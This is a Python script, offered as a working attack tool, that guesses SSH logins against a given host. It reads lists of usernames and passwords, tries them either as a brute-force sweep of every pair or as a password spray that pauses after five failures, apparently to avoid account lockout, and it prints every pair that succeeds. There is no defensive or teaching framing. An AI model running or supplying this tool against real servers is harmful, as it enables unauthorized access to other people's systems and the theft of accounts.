#!/usr/bin/env python3

import paramiko
import argparse
import socket
import sys
import time

parser = argparse.ArgumentParser(description='SSH bruteforce program')
parser.add_argument('-u','--username', help='username')
parser.add_argument('-U','--usernames', help='usernames file')
parser.add_argument('-p','--password', help='password')
parser.add_argument('-P','--passwords', help='passwords file')
parser.add_argument('-s','--host', help='Host IP address')
parser.add_argument('-k','--port', help='port (default 22)',default=22)
parser.add_argument('-t','--timeout', help='timeout after 5 failed attempts (default 60s)',default=60)
#parser.add_argument('method', help='Method of attack: ')
args = vars(parser.parse_args())

method = input("Please select method:\n[1] brute force\n[2] password spray\n")

usernames = []
passwords = []

timeout = int(args['timeout'])

#get single username
if args['username']:
	usernames.append(args['username'])

#get usernames from list
if args['usernames']:
	f = open(args['usernames'],"r")
	for user in f.readlines():
		usernames.append(user.strip("\n"))

#get single password
if args['password']:
	passwords.append(args['password'])

#get passwords from list
if args['passwords']:
	f = open(args['passwords'],"r")
	for passw in f.readlines():
		passwords.append(passw.strip("\n"))

#connect to SSH
port = 22
host,port = args['host'],args['port']

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#bruteforce - mix every combination of username and password
if method == "1":
	print("bruteforce selected")

	for user in usernames:
		for password in passwords:
			try:
				ssh.connect(host,port,user,password)
				print("'%s':'%s' succeeded!" % (user, password))

			except paramiko.AuthenticationException:
				print("'%s':'%s' failed." % (user, password))
				print("Sleeping for 5 seconds")
				time.sleep(timeout)

#password spray - single password against multiple usernames
elif method == "2":
	print("password spray selected")
	print(usernames)
	print(passwords)

	fail_count = 0

	for user in usernames:
		for password in passwords:
			try:
				ssh.connect(host,port,user,password)
				print("'%s':'%s' succeeded!" % (user, password))

			except paramiko.AuthenticationException:
				print("'%s':'%s' failed." % (user, password))
				fail_count += 1

			if fail_count == 5:
				print("5 retries reached, timeout for %d seconds" % timeout)
				time.sleep(timeout)
				fail_count = 0
